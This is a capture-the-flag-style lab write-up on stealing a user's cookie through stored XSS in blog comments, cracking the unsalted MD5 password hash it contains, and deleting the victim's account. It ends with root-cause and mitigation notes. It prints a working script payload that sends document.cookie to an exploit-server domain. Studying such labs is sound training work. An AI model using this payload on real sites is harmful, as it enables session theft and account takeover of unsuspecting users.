User Password Theft via Cookie + XSS – Offline Cracking

Lab Difficulty: Practitioner
Vulnerability: Stored XSS + MD5 Hash in Cookie + Offline Cracking

Summary
This lab combines a few things: stored XSS, weak cookie handling, and offline password cracking. Basically, the app stores the user’s username and MD5-hashed password in a cookie (bad idea), and there’s a stored XSS vuln in the comments. So the plan was: steal Carlos’s cookie using XSS, crack his password offline, then log in and delete his account. Fun combo.

Steps Taken
Logged in with the usual creds:

wiener : peter
After logging in, I checked out the "Stay logged in" feature. The cookie looked like this:

stay-logged-in=Base64StuffHere
Decoded it with Burp Decoder and got something like:

wiener:md5hash
So the format is:

username:md5(password)
Cool. Next goal: steal Carlos’s cookie.

I checked out the blog comment section and tested some XSS. Sure enough, it’s vulnerable to stored XSS.

Went over to the exploit server and noted the domain. Then I posted a comment with this payload:

<script>document.location='//EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
Waited a few seconds, checked the exploit server's access log, and boom—Carlos’s cookie showed up in a GET request.

It looked like this:

carlos:26323c16d5f4dabff3bb136f2460a943
Decoded it, grabbed the hash, and tossed it into Google. The password popped up instantly:

onceuponatime
Logged in as carlos, went to My account, and deleted the account.

Lab complete.

Root Cause
There are a few issues stacked here:

The app stores sensitive info (hashed password) in a cookie—bad move.

It doesn’t properly isolate or sanitize user input in comments, allowing stored XSS.

Using unsalted MD5 makes offline cracking trivial, especially for common passwords.

Basically, all the ingredients for a bad day.

Fixes and Mitigation
Never store password hashes in cookies—use session tokens.

Sanitize and validate all user inputs to prevent XSS.

Avoid weak hash functions like MD5 for passwords.

Add salt to password hashes and store them securely on the server.
